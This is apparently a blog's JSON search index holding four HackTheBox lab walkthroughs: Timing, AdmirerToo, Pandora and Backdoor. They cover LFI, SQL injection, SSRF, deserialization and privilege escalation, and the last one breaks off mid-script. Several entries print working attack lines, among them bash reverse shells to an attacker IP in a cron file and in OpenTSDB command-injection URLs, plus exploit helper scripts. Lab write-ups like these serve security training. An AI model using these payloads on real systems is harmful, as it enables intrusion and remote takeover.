[
  
  {
    "title": "Timing - HackTheBox",
    "url": "/posts/hackthebox/timing.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, bruteforce, filter bypass, static analysis, php, authentication bypass, enumeration, sql injection, arbitrary file upload, git, suid, cron",
    "date": "2022-06-04 00:00:00 +0100",
    
    "snippet": "Timing is a very nice medium-rated linux box that involves a bit of static analysis on PHP files. Foothold involves quite a few steps that start with an LFI vulnerability to read source code of the application to identify a broken authentication logic, an SQL injection flaw to elevate to the website admin, and then an RCE via file upload. User access is through a password reuse, which you recover from a previous git commit. Privesc targets a custom SUID script that runs a Java program, which allows you to write arbitrary files in any directory you can enter.InfoReconNMAP# Nmap 7.70 scan initiated Tue Dec 14 10:59:55 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.135Nmap scan report for timing.htb (10.10.11.135)Host is up (0.22s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Simple WebApp|_Requested resource was ./login.phpService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Dec 14 11:00:44 2021 -- 1 IP address (1 host up) scanned in 48.55 secondsWebThe login form is submitted via a simple POST request with two parameters;After playing around with it, I noticed a significant delay when sending a login request with the username admin than with any other username. This indicate the username admin may be valid, and the delay could be used to enumerate valid users.Knowing that this is a PHP website, I started bruteforcing the web root for hidden files using ffuf, and found a few that look interesting;Most are login protected, except /image.php, which gave a 200 response with empty body. I started fuzzing it for parameters, and caught a break after a few requests because I got a non-empty response;Doing the request in burp, I got the following message;After a few tests, I understood the parameter is used to read local files, presumably images. The file:// protocol is blocked by the web app, but the filter does not consider the fact that URL protocols in many cases are case-insensitive, meaning file:// and FILE:// are all valid. This allowed me to bypass the filter by changing the protocol to uppercase. The page is vulnerable to LFI.FootholdSource Code AnalysisWith the LFI vuln identified, I began to enumerate the source code of the web application in hope of finding something. Checking the default Apache2 configuration file at /etc/apache2/sites-available/000-default.conf showed that the web root is at /var/www/html. Attempting to view the source code of the index.php file using the LFI returned a 302 redirect to the login page;This indicate the server is executing the included file via the LFI as a PHP code, which means I can gain arbitrary code execution if I can write to file on the server. But I have no way to do so at the moment, so I continued to look for ways to read PHP code without executing it. The method that worked was using the php:// protocol, which have a filter that can be used to read a file as a base64 encoded string;I used this approach to dump a couple of PHP files I have discovered either through bruteforce, or code analysis.With interesting PHP files downloaded, I began to analyse them for something I could exploit. I discovered that the file that checks if a user is authenticated has a broken logic, which can be exploited to access restricted pages that do not perform explicit user validation. Take a look at the below code;&amp;lt;?php//ini_set(&#39;display_errors&#39;, &#39;1&#39;);//ini_set(&#39;display_startup_errors&#39;, &#39;1&#39;);//error_reporting(E_ALL);// session is valid for 1 hourini_set(&#39;session.gc_maxlifetime&#39;, 3600);session_set_cookie_params(3600);session_start();if (!isset($_SESSION[&#39;userid&#39;]) &amp;amp;&amp;amp; strpos($_SERVER[&#39;REQUEST_URI&#39;], &quot;login.php&quot;) === false) {    header(&#39;Location: ./login.php&#39;);    die();}?&amp;gt;The if condition checks if there is no session variable named userid, and whether the requested URL does not contain the string login.php. If this two conditions are satisfied, user is redirected to the login page. This is a broken logic because if any of the conditions were not satisfied, the user will be asumed to be logged in.Although we can’t control the first check that uses session variable, we can control the second one as the validation is performed on a URL we provided, and all we have to do is make sure it contains the string login.php. Since the whole URL is used for validation, I was able to bypass authentication by adding a GET parameter to the URL with the value login.php;This still did not give me access to any other key functionality in the web app, so I continue to study the source files. I eventually caught a break because the file profile_update.php is clearly vulnerable to SQL injection at line 47, which I couldn’t exploit because the page attempts to validate the user account, which will fail before the vulnerable code is executed;The file admin_auth_check.php looks like it’s being used to verify if a user is an admin using the session variable role, which for admins is set to 1;&amp;lt;?php  include_once &quot;auth_check.php&quot;;  if (!isset($_SESSION[&#39;role&#39;]) || $_SESSION[&#39;role&#39;] != 1) {    echo &quot;No permission to access this panel!&quot;;    header(&#39;Location: ./index.php&#39;);    die();  }?&amp;gt;This is very interesting because the role is saved in the backend database, which I can write to using the SQL Injection flaw discovered earlier. But not yet because I still have no access to a valid account.Hunting For Valid UsersAt this point I have no way of moving forward that I can think of without a valid authenticated session on the website. So I continue to exploit the delay in response to enumerate valid usernames.Eventually, I discovered a user with the name aaron. Testing for weak passwords, I was able to login to his account using the password aaron;Now with a valid account on the site, I can begin to exploit the previously discovered vulnerabilities.Popping a ShellGoing to the “Edit profile” tab, I was given a form to update my profile info, which burp showed is being sent to the PHP file that was previously found to be vulnerable to SQL Injection;A look at the login.php source showed that the role of a user is loaded from the column role. Using the SQL injection flaw, I set the role of aaron to 1, making him an admin;I then logged out and logged back in, and I’m now working as an admin. This gave me access to the admin panel, and the avatar_uploader.php page that I can use to upload files;So I started analysing the source code of files involved in the upload. The code that process the uploaded file is upload.php, which restrict the extension of uploaded files to .jpg only. Uploaded files are saved in the web root at images/uploads/, but the filename is prefixed with a seemingly random token;$file_hash = uniqid();$file_name = md5(&#39;$file_hash&#39; . time()) . &#39;_&#39; . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);$target_file = $upload_dir . $file_name;$error = &quot;&quot;;$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));The function uniqid() returns a 13 character long alphanumeric string based on the current system time in milliseconds. But notice that in the second line, the value is passed to the call to md5() as &#39;$file_hash&#39; enclosed in single quotes. In PHP, this will pass the literal string $file_hash, instead of the value the variable contains. This makes bruteforcing this token a lot easier since we only need to target the output of time(), which is the current epoch time in seconds.With all this info, I made a simple python script that will generate possible names an uploaded file is saved as, and used ffuf to locate it. I saved the below script as make_paths.py;#!/usr/bin/python3#------------------------------------------------------------------------------------#   A script for generating the possible image upload paths in Timing (HackTheBox).# To be executed immediately after uploading a file named &quot;test.jpg&quot;, then pipe# the output to file which you can use as bruteforce wordlist with tools like ffuf.#   This was tested with timezone set to WAT (UTC + 1), so you may need to modify the# script to suit yours.#                                                   Author: https://4g3nt47.github.io#------------------------------------------------------------------------------------from time import timefrom hashlib import md5stime = int(time()) # The starting timefilename = &quot;test.jpg&quot; # The basename of the file uploaded.def hashstr(val): # Return an md5 hash of a string.  return md5(val.encode(&quot;UTF-8&quot;)).hexdigest()for i in range(300): # Generate candidates for 5 minute  path = &quot;images/uploads/&quot; + hashstr(&quot;$file_hash&quot; + str(stime)) + &quot;_&quot; + filename  print(path)  stime -= 1; # Go back 1 second in timeI probably need to sync my time with the box, but I don’t see NTP running on the host (port 123). So I generated a bind shell because the host is blocking all outgoing connections (I figured this out after a couple of tests) and saved it as test.jpg;I uploaded it to the site, and immediately run the make_paths.py script to generate possible paths and save as paths.txt. I then used ffuf to find the valid path with threads set to 1 because the order is important. It worked!Now that I can write files, and find out exactly where they are stored, I can use the previously discovered LFI on image.php to run my own code;This gave me a shell on the box as www-data;UserIn the root of the web app, I found a database password in the file db_conn.php, and there is a MySQL service running locally on port 3306;I found the hashed password of the admin user in the database, but it was taking too long to crack with john, so I moved on.Listing the /home directory showed that a local user named aaron exist. Testing his password for the web app on the local account (aaron) did not work.Looking through the filesystem, I found an interesting file at /opt/source-files-backup.zip, which I extracted to /dev/shm for analysis. The file appears to contain the backup of all the source code of the web app. A .git directory exists in the root of the folder, which indicate it’s a git repository.The box has git installed, so I ran git log to show previous commits;The commit message of the last commit looks interesting, so I ran git diff on it to see the changes made. I was rewarded with a password;Testing the password against the account of aaron, I gained access;PrivEscThe user aaron has sudo permissions on the file /usr/bin/netutils, which is a simple bash script that calls a Java program located in the home directory of the root user;The program is a download utility that prompts for protocol and URL. Using the HTTP protocol, I was able to download a file from my attack host. This is when I realised I could connect to my box over port 80, which previously didn’t work when I was trying to gain a foothold on the box. After exiting the program, I realised that the file is downloaded to my current working directory, and saved as root. This could allow me to write to any directory I can cd into.My first attempt was to create a cron job by writing to /etc/cron.d. This is important because cron files do not need to have execute permission, which I can’t set because the file ownership will be assigned to root. This didn’t work because at first because I messed up the syntax of the cron file I uploaded. After some tests locally on my box, I created a file named mycron with the contents;* * * * * root /bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.53/443 0&amp;gt;&amp;amp;1&#39;I then start a HTTP server locally on my box to host the cron file, and then moved into /etc/cron.d (in the target box) and download the file. I then started a listener on port 443, and received a privileged reverse shell after about a minute;Summary  Identified port 22 and 80.  Identified a time delay in the web login when submitting valid username.  Bruteforced a file /image.php in the web root.          Bruteforced a GET parameter img, which was found to be vulnerable to LFI.        Discovered a user named aaron that uses the password aaron.          Exploited an SQL Injection flaw to elevate to admin in the site.      Chained an arbitrary file upload and an LFI  flaw to gain RCE.        Inside as www-data          Recovered a password in a previous git commit, which gave me access to the account of aaron over SSH.        Inside as aaron          Identified a sudo permission on a script that allows for file download to working directory as root.      Used it to create a cron task by writing to /etc/con.d to gain code execution as root.      "
  },
  
  {
    "title": "AdmirerToo - HackTheBox",
    "url": "/posts/hackthebox/admirertoo.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, adminer, mysql, php, ssrf, opentsdb, rce, opencats, fail2ban, whois, object injection, insecure deserialization, phpggc",
    "date": "2022-05-29 00:00:00 +0100",
    
    "snippet": "AdmirerToo is a hard-rated linux box. It starts with an SSRF exploit on Adminer to access an instance of OpenTSDB on port 4242, which is vulnerable to RCE. This will give you a shell on the box as opentsdb, which you can use to extract credentials from a configuration file and gain access to the account of jennifer due to password reuse. An instance of OpenCATS is running locally on port 8080, which you can access by setting up an SSH tunnel. OpenCATS is running as the user devel, who has write permissions on the directory /usr/local/etc, and is vulnerable object injection that you can use to write files in the directory, and exploit the Fail2Ban service to gain code execution as root.InfoReconNMAP# Nmap 7.70 scan initiated Sat Feb 12 11:41:17 2022 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.137Increasing send delay for 10.10.11.137 from 0 to 5 due to 192 out of 638 dropped probes since last increase.Nmap scan report for admirertoo.htb (10.10.11.137)Host is up (0.34s latency).Not shown: 997 closed portsPORT     STATE    SERVICE        VERSION22/tcp   open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: |   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)80/tcp   open     http           Apache httpd 2.4.38 ((Debian))| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Admirer4242/tcp filtered vrml-multi-useService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Feb 12 11:42:38 2022 -- 1 IP address (1 host up) scanned in 80.99 secondsWebThis is a PHP site due to presence of /index.php. The chat bubble in the homepage sent a request to the index page, but the request does not seem to be processed by the server as there are no changes in response;Requesting a non-existing page leaked a possible domain;I updated my hosts file with it, and reload the page. Nothing changed.Fuzzing for subdomains with ffuf, I got a hit;db.admirer-gallery.htbClicking the enter button, I was login to a database management service like phpMyAdmin as the user admirer_ro;I have access to the database gallery, but I can’t make any changes to it;Going to the privileges menu from the homepage, I was able to read the password hash of the admirer_ro user;The password hash could not be cracked using john and rockyou.txt, so I moved on.However, I did not enter any password to login to the service, so I looked through my traffic in burp, and found a password 1w4nn4b3adm1r3d2!;Looking at the source code of the login page, I found even more useful info;Adminer  Adminer is a tool for managing content in MySQL databases. Adminer is distributed under Apache license in a form of a single PHP file. Its author is Jakub Vrána who started to develop this tool as a light-weight alternative to phpMyAdmin, in July 2007.The service has support for custom plugins, which are installed in the /plugins directory;My first attempt at exploiting this service is to get it to authenticate to my own MySQL server, which may let me read local files on the server running adminer into my own database. So I created a database named admirer, and add a user to it with the username admirer_ro and password 1w4nn4b3adm1r3d2!.Using burp’s intercept, I passed all the relevant config to the server;This didn’t work, and the login page displayed an error message;So I repeat the process with a wrong password to see if I can get a different response. I did;This indicate the first login attempt was likely successful. So I fired up Wireshark to see what exactly is going on.As you can see from the following packets, the box did manage to successfully authenticate to my MySQL database;However, the client exited using the quit (the last highlighted packet) command after the authentication has been completed. I have no clue why this is happening, may be the service is doing some sort of validation?Another thing I saw while going through the packets is support for LOAD DATA LOCAL command by the client, which is a command I could use to read local files on the box should the server allow it;After the MySQL session was closed, my box made a HTTP request to the server, and was given a 403 Forbidden response;My guess is this is somehow interfering with the web login. The cookies look very interesting, so I started studying them. The cookie adminer_permanent is a URL-encoded base64-string;The cookie contains the database host, database name, and database username. The cookies adminer_key and adminer_sid look interesting, but I have no idea what they are. So I decided to install Adminer locally on my box in hope of learning more about them.I installed Adminer in a docker container along with a MySQL server, then I configured another MySQL service on my main host. In both databases, I created a database named admirer and created a user for it named admirer_ro with the passwords set to 1w4nn4b3adm1r3d2!. Interestingly, my approach worked locally, and I was able to get the Adminer service in my docker container to connect to the database on my main host. I have no clue why it’s not working on the box, so I just moved on.Searching for exploits for the version of adminer running, I found this at https://github.com/advisories/GHSA-x5r2-hj5c-8jx6;The version of Adminer running on the host is vulnerable to SSRF. The PoC is in a linked PDF. It links to a python script at https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd, which can be used to setup the redirect.SSRF flaws are mainly used to access internal resources, or resources we are not allowed to directly access. Going back to my initial port scan, NMAP reported port 4242 as filtered;---[snip]---|_http-title: Admirer4242/tcp filtered vrml-multi-useService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel---[snip]---So I setup the redirection script to redirect requests to my box on port 80 to the filtered service at http://127.0.0.1:4242. I then send a login request with the server set to my box and driver set to elastic (for Elasticsearch);This worked, and I got a response from the hidden service;It seems the service supports the HTTP protocol. The title OpenTSDB looks interesting, so I started googling it;  OpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase. OpenTSDB was written to address a common need: store, index and serve metrics collected from computer systems (network gear, operating systems, applications) at a large scale, and make this data easily accessible and graphable.Seaching for known exploits for this service, I found a Command Injection vulnerability at https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-35476.yamlUsing the PoC provided that runs a wget command, I got a long error message about a missing “metric”;Googling on what exactly a “metric” is in this service, I learned that;  In OpenTSDB, a metric is named with a string, like http. hits . To be able to store all the different values for all the places where this metric exists, you tag the data with one or more tags when you send them to the TSD. TSD stores the timestamp, the value, and the tags.There is a way to list available metrics using the query /api/suggest?type=metrics. Using it on the host returned one entry http.stats.web.hits;So I updated the exploit using this metric;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;amp;end=2020/10/25-15:56:44&amp;amp;m=sum:http.stats.web.hits&amp;amp;o=&amp;amp;ylabel=&amp;amp;xrange=10:10&amp;amp;yrange=[33:system(%27nc%2010.10.16.53%20443%27)]&amp;amp;wxh=1516x644&amp;amp;style=linespoint&amp;amp;baba=lala&amp;amp;grid=t&amp;amp;jsonAnd bingo!!!I used this exploit to spawn a shell on the box as opentsdb user;http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;amp;end=2020/10/25-15:56:44&amp;amp;m=sum:http.stats.web.hits&amp;amp;o=&amp;amp;ylabel=&amp;amp;xrange=10:10&amp;amp;yrange=[33:system(%27%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.53%2F443%200%3E%261%22%27)]&amp;amp;wxh=1516x644&amp;amp;style=linespoint&amp;amp;baba=lala&amp;amp;grid=t&amp;amp;jsonUserLocal user with the name jennifer exists. The user I am working as is not part of any groups. linPEAS found some creds;This creds were found in the file /etc/opencats/config.php. I was able to login to the local MySQL server using it;This user has access to only one database, which contains the below tables;+--------------------------------------+| Tables_in_cats_dev                   |+--------------------------------------+---[snip]---| site                                 || sph_counter                          || system                               || tag                                  || user                                 || user_login                           || word_verification                    || xml_feed_submits                     || xml_feeds                            || zipcodes                             |+--------------------------------------+The table user looks interesting, and was found to contain some hashes;MariaDB [cats_dev]&amp;gt; select user_id, email, user_name, password from user;+---------+-------------------------+----------------+----------------------------------+| user_id | email                   | user_name      | password                         |+---------+-------------------------+----------------+----------------------------------+|       1 | admin@testdomain.com    | admin          | dfa2a420a4e48de6fe481c90e295fe97 ||    1250 | 0                       | cats@rootadmin | cantlogin                        ||    1251 | jennifer@admirertoo.htb | jennifer       | f59f297aa82171cc860d76c390ce7f3e |+---------+-------------------------+----------------+----------------------------------+3 rows in set (0.001 sec)I was unable to crack any of the hashes using the rockyou.txt wordlist with john, so I moved on.The box doesn’t allow to me to list the processes of other users, only mine;Using pspy also didn’t help, so we are probably in a jailed environment.There are a few other ports listening;The service on port 8080 caught my attention. This is a port normally used by web proxies, so I tried to use it with curl to make a request, but it didn’t work;It keeps closing connections about one second after they were established, even without sending any data.Looking at the /opt directory, I saw 2 directories owned by the root user;A quick search in searchsploit showed 2 vulns for OpenCATS;This is a free open-source applicant tracking system (ATS)., with documentation at https://opencats-documentation.readthedocs.io/After further enumeration of the filesystem, the file /var/www/adminer/plugins/data/server.php was found to contain the configuration of the one-click login plugin installed in Adminer. The file contains a commented-out password, which turns out to be the password of jennifer. This was easier than I expected;&amp;lt;?phpreturn [  &#39;localhost&#39; =&amp;gt; array(//    &#39;username&#39; =&amp;gt; &#39;admirer&#39;,//    &#39;pass&#39;     =&amp;gt; &#39;bQ3u7^AxzcB7qAsxE3&#39;,// Read-only account for testing    &#39;username&#39; =&amp;gt; &#39;admirer_ro&#39;,    &#39;pass&#39;     =&amp;gt; &#39;1w4nn4b3adm1r3d2!&#39;,    &#39;label&#39;    =&amp;gt; &#39;MySQL&#39;,    &#39;databases&#39; =&amp;gt; array(      &#39;admirer&#39; =&amp;gt; &#39;Admirer DB&#39;,    )  ),];This password gave me access to the box over SSH as jennifer;PrivEscjennifer does not have sudo permissions on the box, and I still cannot list running processes belonging to other users.Looking for attack vectors, I noticed the modification date of /usr/bin/pkexec dates back to 15 Jan 2019. This indicate it may be vulnerable to the pwnkit exploit. Searching for exploits, I found one at https://github.com/ly4k/PwnKit. Testing the exploit on the box, I was elevated to root immediately. This is way too easy for a hard box, so I contacted a staff through the HTB discord, and found out it is indeed unintended. So I switched back to jennifer, and started looking for the intended way.Since I now have access to the box over SSH, I can use it to setup tunnels to those local ports, and hopefully identify them using nmap. After setting up the tunnels, I performed a version scan on the ports;The service on port 8080 was now identified as Apache httpd 2.4.38 ((Debian)). Opening it up in my browser, I got a login page;Testing the credentials I have up to this point for an easy win, I was able to login using the username jennifer and password bQ3u7^AxzcB7qAsxE3;The footer showed the version of OpenCATS running is 0.9.5.2. Notice that jennifer has read-only access to the serviceOpenCATSWith the version of OpenCATS now known, I started looking for exploits. The article https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html showed that the service is vulnerable to arbitrary file write due to unsafe PHP object deserialization.  OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.The request of interest is triggered after hitting any of the below links;This generate a GET request with the parameter parametersactivity:ActivityDataGrid containing the serialized PHP object;Following the article, I tried to write a file to the root of the web app at /opt/opencats, but got a 500 error response. This is probably because of permission issues as the web root is owned by the root user.So I tried to create a file in the globally writable directory /dev/shm, and it worked;The file is created as the user devel. The user devel does not have a login shell, and his home directory does not exist;So I begin to search the filesystem for files and directories this user owns, and found a few;devel has write permissions on two key directories;Both directories are empty. The directory /usr/local/etc is used by some programs to store and load configuration files. So I started looking for any program I could exploit using this. Listing running services using systemctl showed that Fail2Ban, which is an IPS-like service that blocks suspicious IPs, is running on the host;Searching for known expoits for this service, I found an article explaining how it could be exploited at https://research.securitum.com/fail2ban-remote-code-execution/The article explains how data passed to the mail command without validation can lead to arbitrary code execution using the ~! escape sequence. I was able to test this locally, and it worked. A shell command was executed in my default login shell;Reading further into the article, this paragraph was particularly interesting;When Fail2Ban bans an IP, it sends an email notification to a defined address. The email will contain the result of a whois lookup for the IP address. So if I could control this, I could add a command that will be executed in the result of the whois lookup.Testing this with a user account that does not have a default shell didn’t work;Changing the escape from ~! to ~| did the trick;Now all I needed to do is create a whois config that will direct all whois lookups to my machine on port 43. To do this, I need to create a configuration file at /usr/local/etc/whois.conf that will be used by whois. I can use the deserialization exploit to do this, but the problem is other data is added to my payload;Note that only the highlighted text is my actual payload. After studying a bit on whois configuration files, I learned that the configurations have to be in regular expression. After lots of trials and errors, I was able to craft a valid whois config file to match my IP address using the payload &quot;}]|10.10.16.53 [10.10.16.53];As you can see above, I was able to get whois to query my own server. Now I have all I need to execute commands on the box.With the whois configuration file in place, I started a netcat listener on port 43 to send the payload as a whois response;Then I started another listener on port 443 to receive the above reverse shell. Now to trigger the exploit, I need to make Fail2Ban, which is running as root, to ban my IP. This will result in a whois request that will be replied to with my payload. To trigger this ban, I bruteforced the SSH login using hydra, which made Fail2Ban ban my IP. This resulted in a whois lookup to my box;The request hangs however, and I had to press CTRL + C to exit. After closing the fake whois server, my payload was executed, and I got a shell in the box as root;This is the hard box I managed to solve, and even though it took some nudges, I was very happy!!!Summary  Discovered port 22, 80, and 4242 (filtered) with nmap  Found a subdomain db.admirer-galley.htb  running an instance of Adminer.  Exploited an SSRF flaw in Adminer to access the service on port 4242.  Service on port 4242 (OpenTSDB) was found to be vulnerable to RCE, which gave me access to the box as the local user opentsdb.  Inside as opentsdb          Recovered a password in the configuration file of the one-click login plugin used by Adminer.      Gained access to the account of jennifer due to password reuse.        Inside as jennifer          Setup a tunnel to an instance of OpenCATS running locally on port 8080, and logged in as jennifer.      Exploited a PHP deserialization flaw to create files on the server as the user devel.      devel has write access to /usr/local/etc, which I exploited to create whois config that queries my server.      Exploited the way Fail2Ban is calling mail with the output of whois lookups to gain code execution as root.      "
  },
  
  {
    "title": "Pandora - HackTheBox",
    "url": "/posts/hackthebox/pandora.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, snmp, vhost, apache, php, static analysis, lfi, suid, reverse engineering, path tampering, radare2",
    "date": "2022-05-21 00:00:00 +0100",
    
    "snippet": "Pandora is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port 161 (UDP) for running processes, which will give you the credentials of a local user. This will give you SSH access to the box, which you will use to setup a tunnel to an apache vhost that’s accessible only locally. This site is vulnerable to LFI ( I later found out this is unintended, and never got around to actually doing the box the intended way :p ) which you can use to move to another local user, and from there exploit a custom SUID binary through path tampering to gain code execution as root.AboutReconNMAP# Nmap 7.70 scan initiated Fri Jan 28 14:55:17 2022 as: nmap -sS -sV -v -oN nmap.txt 10.10.11.136Nmap scan report for pandora.htb (10.10.11.136)Host is up (0.29s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Jan 28 14:59:09 2022 -- 1 IP address (1 host up) scanned in 232.39 secondsWebThe site has a contact-us form that does generate a request, but the response, which just returns the homepage of the site, does not change no matter what I did to the parameters;Bruteforcing the web root for hidden files, and also for hidden subdomains didn’t give me anything of use. A quick UDP port scan with NMAP showed port 161 (SNMP) is open. So I scanned it deeper with -sU -sC -sV flags, and found a credential daniel:HotelBabylon23 that is being passed to a script as command line argument;The script that did this enumeration is snmp-processes, which is used to discover running processes on a host running SNMP. Using the credential, I was able to get access to the box over SSH;Userpandora.panda.htbAfter poking around a little inside the box, the apache configuration file at /etc/apache2/sites-available/pandora.conf showed a hidden subdomain;I added the hostname to my /etc/hosts file, but was unable to access it as on request the server simply returns that static web page at pandora.htb/. Notice in the first line of the Apache2 config that the hostname for the virtual host is localhost. This means the domain is accessible only locally. So with my SSH access into the box, I setup an SSH tunnel so I can access the site over port 8888 on my attack host;Then I updated my /etc/hosts file;And it worked;I couldn’t read the include/config.php file as it is owned by matt and the permissions were locked down.A search in searchsploit for exploits targeting this service gave a bunch of results;Testing the credentials of daniel, I was able to get a different response that indicates a valid credential, with possibly restricted permissions;I have no idea what this API is, so I went back into the box as daniel, and start going through the source code of the web app. Inside the include/ folder, I found a file named api.php, which likely contains the implementation of the API I have access to.Sending a request to the URL at /include/api.php gave me this;So I started poking around at the source code of the API to figure out how it works. It accepts username and password through the GET parameters user and pass respectively. Supplying the creds of daniel gave me a different output;Reviewing the source code even more, I realized it expects to be told the task to perform using the parameter op;The above gave us three valid values for the op parameter, which are get, set, and help. Looking further into the source code revealed something nice;If I can control the value assigned to the variable $ext_name, I can control the file that will be included, which I could exploit to load PHP files for arbitrary code execution. Turns out I can, because $ext_name is assigned the value of a GET parameter;So I logged back into the box and into /dev/shm/.0 directory, and created a PHP script named .api.php containing my reverse shell;I then have the web app execute the script using the request;Sending this, I got a shell as the user matt;PrivEscThe user matt does not have sudo permissions on any file in the box. Searching for SUID binaries gave an interesting result;It’s a binary file, so I shipped it over to my attack host and opened it in radare2. Dumping strings contained in the binary revealed a possible command that could be vulnerable to path tampering;I checked if it’s indeed used as a command by listing all references to it using the command axt @ &amp;lt;address&amp;gt;. I got one match in the main() function;Using my shell on the box as matt, I moved to a writeable directory, created a file named tar containing a reverse shell, made it executable, added it to the $PATH variable, and called the pandora_backup script. This gave me root access to the box;Summary  Identified port 22 and 80.  UDP port scan revealed port 161 (SNMP) is open.  NMAP’s snmp-process revealed a password for a user named daniel, which gave access to the box over SSH.  Inside as daniel          Found a vhost configured with apache that is accessible only locally.      Setup a tunnel through SSH to access the site from my box.      Found a vulnerable API that can be exploited for code execution as the user matt.        Inside as matt          Found a custom SUID script.      Basic analysis with radare2 showed it’s vulnerable to path tampering.      Exploited it to gain code execution as root.      "
  },
  
  {
    "title": "Backdoor - HackTheBox",
    "url": "/posts/hackthebox/backdoor.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, easy, web, wordpress, path traversal, lfi, cve, metasploit, gdbserver, screen",
    "date": "2022-04-23 00:00:00 +0100",
    
    "snippet": "Backdoor is a very easy linux box on HackTheBox. It starts with a web service running wordpress with a plugin that’s vulnerable to path traversal, which you can use to read arbitrary files on the box. You then use this bug to identify a service running on the box on port 1337, which you can exploit to gain a foothold on the box as the local user. Privesc is stupidly easy, and targets a screen session running on the box as root.AboutReconNMAP# Nmap 7.70 scan initiated Sat Nov 20 20:00:32 2021 as: nmap -sC -sV -oN nmap.txt -v backdoor.htbNmap scan report for backdoor.htb (10.10.11.125)Host is up (0.28s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.8.1| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;amp;#8211; Real-LifeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Nov 20 20:01:23 2021 -- 1 IP address (1 host up) scanned in 51.47 secondsWebWappalyzer identified it as a wordpress site;Oddly, the default wordpress plugins directory on the site shows the index of the directory, saving us the need to enumerate plugins;A search on exploitdb using searchsploit showed this plugin has a vulnerability;Using the PoC, I was able to view the file /etc/hosts on the box;FootholdUsing the file traversal bug, a credential was recovered from the wordpress config file wp-config.php;I was unable to login to the admin dashboard using the credential. Trying the password for the user user over SSH also didn’t work;I spent some time working with the file traversal bug, but couldn’t find anything of much interest. A full nmap scan on the host showed port 1337 is open, but could not be identified;Using the file traversal bug, I wrote a simple program to enumerate running processes by burteforcing /proc/&amp;lt;pid&amp;gt;/cmdline in hope of finding the process;#!/usr/bin/python3#------------------------------------------------------------------------------#   A program for bruteforcing running processes on Backdoor (HackTheBox) using# the path traversal bug in a wordpress plugin.#                                                               Author: 4g3nt47#------------------------------------------------------------------------------import queueimport requestsimport threadingfrom time import sleepabort = Falsethreads = 10pids = queue.Queue()for i in range(0, 1000):  pids.put(i)def brute():  while pids.empty() == False and abort != True:    proxies = {&quot;http&quot;:&quot;http://localhost:8080&quot;}    pid = pids.get()    url = &quot;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/%d/cmdline&quot; %(pid)    try:      content = requests.get(url).content.decode().strip()      invalid = &quot;/proc/%d/cmdline&quot; %(pid)      invalid = invalid + invalid + invalid + &quot;&amp;lt;script&amp;gt;window.close()&amp;lt;/script&amp;gt;&quot;      if content and content != invalid:        print(&quot;%d : %s&quot; %(pid, content))    except:      continuefor i in range(threads):  t = threading.Thread(target=brute)  t.start()while pids.empty() == False:  try:    sleep(5)    